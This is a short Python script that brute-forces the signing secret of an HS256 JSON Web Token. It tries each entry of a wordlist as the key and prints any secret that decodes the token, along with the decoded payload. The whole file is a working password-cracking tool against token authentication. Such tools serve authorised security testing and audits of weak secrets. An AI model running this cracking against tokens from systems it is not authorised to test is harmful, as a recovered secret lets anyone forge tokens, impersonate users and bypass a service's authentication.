import jwt
import sys

# Load JWT token and wordlist file
jwt_token = input("Enter your JWT Token :")
default_wordlist = "src/default.txt"
wordlist_file = input(f"Enter your wordlist path (default wordlist is: {default_wordlist}):")

# If the user doesn't provide any input, use the default wordlist
if not wordlist_file:
    wordlist_file = default_wordlist

print(f"Using wordlist file: {wordlist_file}")

# Define the algorithm used (e.g., HS256)
algorithm = "HS256"

# Function to try and brute-force the JWT secret
def jwt_bruteforce(jwt_token, wordlist_file, algorithm):
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            for secret in f:
                secret = secret.strip()  # Remove any extra spaces or newlines
                try:
                    # Attempt to decode JWT using each secret in wordlist
                    decoded = jwt.decode(jwt_token, secret, algorithms=[algorithm])
                    print(f"\n[+] Secret found: {secret}\n")
                    print(f"Decoded JWT Payload:\n {decoded}")
                    return secret
                except jwt.InvalidTokenError:
                    continue  # Continue if the secret is wrong
        print("[-] No valid secret found in the wordlist.")
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

# Call the brute force function
jwt_bruteforce(jwt_token, wordlist_file, algorithm)
